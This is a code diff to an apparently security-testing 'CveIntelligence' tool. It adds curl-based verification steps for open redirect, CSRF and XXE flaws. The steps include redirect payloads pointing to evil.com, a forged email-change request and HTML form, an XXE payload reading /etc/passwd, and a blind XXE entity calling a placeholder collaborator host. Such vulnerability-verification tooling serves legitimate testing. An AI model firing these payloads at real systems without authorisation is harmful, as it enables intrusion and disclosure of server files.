@@ -1628,6 +1628,59 @@ class CveIntelligence:
                 expected="uid=33(www-data) confirms webshell execution",
             )
 
+        elif vc == "open_redirect":
+            step(
+                f"Test {ep} with absolute URL redirect: https://evil.com",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode 'redirect_to=https://evil.com' | grep -i 'location:'"),
+                expected="Location: https://evil.com confirms open redirect",
+            )
+            step(
+                "Try URL-encoded payloads to bypass validation: https://%2Fevil.com, //evil.com",
+                curl=(f"curl -si '{full_ep}?redirect_to=%2F%2Fevil.com' | grep -i location"),
+                expected="Location header pointing to evil.com or unexpected external domain",
+            )
+            step(
+                "Parameter name variants: next, url, return, returnUrl, back, goto",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode 'next=https://evil.com' | grep -i location"),
+                expected="Redirect to evil.com",
+            )
+
+        elif vc == "csrf":
+            step(
+                f"Verify {ep} has no CSRF nonce in the request",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-H 'Origin: https://evil.com' "
+                      f"-H 'Referer: https://evil.com/' "
+                      f"-d 'email=attacker@evil.com' | head -10"),
+                expected="HTTP 200 with action performed (email changed, settings saved, etc.)",
+            )
+            step(
+                "Craft minimal HTML PoC to test from a browser",
+                curl=(f"echo '<form method=POST action=\"{full_ep}\"><input name=email value=pwned@evil.com>"
+                      f"<input type=submit></form>' > /tmp/csrf.html && open /tmp/csrf.html"),
+                expected="Action completes without requiring nonce — CSRF confirmed",
+            )
+
+        elif vc == "xxe":
+            step(
+                f"Test {ep} with inline XML entity injection",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-H 'Content-Type: application/xml' "
+                      f"-d '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>' "
+                      f"| grep root"),
+                expected="root:x:0:0 in response body — confirms XXE with LFI",
+            )
+            step(
+                "Blind XXE via out-of-band: entity pointing to Collaborator",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-H 'Content-Type: application/xml' "
+                      f"-d '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM \"http://YOUR_COLLABORATOR_HOST/\">%xxe;]><x/>'"
+                      ),
+                expected="DNS/HTTP request at Collaborator confirms blind XXE",
+            )
+
         else:
             step(
                 f"Test {ep} with malformed/boundary input for each parameter",
